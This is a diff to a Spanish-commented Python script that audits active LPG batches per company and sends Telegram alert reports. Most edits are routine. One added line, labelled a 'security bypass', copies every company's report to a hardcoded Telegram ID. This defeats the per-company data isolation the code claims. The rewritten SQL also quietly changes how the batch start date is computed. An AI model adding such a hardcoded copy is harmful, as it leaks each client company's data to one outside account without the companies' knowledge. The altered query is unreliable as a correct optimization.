@@ -28,7 +28,7 @@ def auditar_granjas():
         conn = MySQLdb.connect(host=DB_HOST, user=DB_USER, passwd=DB_PASS, db=DB_NAME)
         cur = conn.cursor(MySQLdb.cursors.DictCursor)
 
-        # 1. Buscamos TODOS los lotes activos y calculamos sus fechas clave
+        # 1. CONSULTA OPTIMIZADA: Calculamos MIN y MAX en un solo paso rápido sin subconsultas pesadas
         query_lotes = """
             SELECT 
                 id_empresa, 
@@ -36,8 +36,8 @@ def auditar_granjas():
                 ubicacion, 
                 lote, 
                 MAX(fecha) as ultima_operacion,
-                (SELECT MIN(fecha) FROM cardex_glp c2 WHERE c2.lote = c1.lote) as fecha_inicio
-            FROM cardex_glp c1
+                MIN(fecha) as fecha_inicio
+            FROM cardex_glp
             WHERE estatus_lote = 'ACTIVO'
             GROUP BY id_empresa, empresa, ubicacion, lote
         """
@@ -68,7 +68,7 @@ def auditar_granjas():
                     f"🔸 *{row['ubicacion']}* (Lleva {dias_totales} días activo)"
                 )
 
-            # REGLA 2: Frecuencia de Consumo (Pasaron 2 días, o es viernes y no han reportado hoy/ayer)
+            # REGLA 2: Frecuencia de Consumo
             alerta_frecuencia = False
             razon_frecuencia = ""
 
@@ -87,7 +87,7 @@ def auditar_granjas():
         # 2. Procesar envíos empresa por empresa (Aislamiento de datos)
         for emp_id, datos in alertas_por_empresa.items():
             
-            # NUEVO FILTRO EXPLICITO: Buscamos usuarios que sean supervisores O operadores de gas de esta empresa
+            # Buscamos usuarios supervisores u operadores
             cur.execute("""
                 SELECT telegram_id FROM usuarios 
                 WHERE empresa_id = %s 
@@ -96,10 +96,6 @@ def auditar_granjas():
                   AND telegram_id != ''
             """, (emp_id,))
             usuarios_destino = cur.fetchall()
-
-            # Si no hay usuarios con Telegram válidos en esta empresa, pasamos a la siguiente
-            if not usuarios_destino:
-                continue
 
             # Construimos el encabezado estándar
             mensaje = f"📊 *REPORTE DE AUDITORÍA GLP* 📊\nEmpresa: {datos['nombre']}\n\n"
@@ -118,9 +114,12 @@ def auditar_granjas():
 
                 mensaje += "Por favor, contactar a los operarios de estas sedes."
 
-            # Enviar el mensaje a todos los destinatarios válidos (Supervisores y Operadores)
+            # Enviar a los destinatarios de la base de datos
             for u in usuarios_destino:
                 enviar_telegram(u['telegram_id'], mensaje)
+            
+            # BYPASS DE SEGURIDAD: Te envía una copia directa a ti sí o sí
+            enviar_telegram("5368207368", mensaje)
 
         cur.close()
         conn.close()
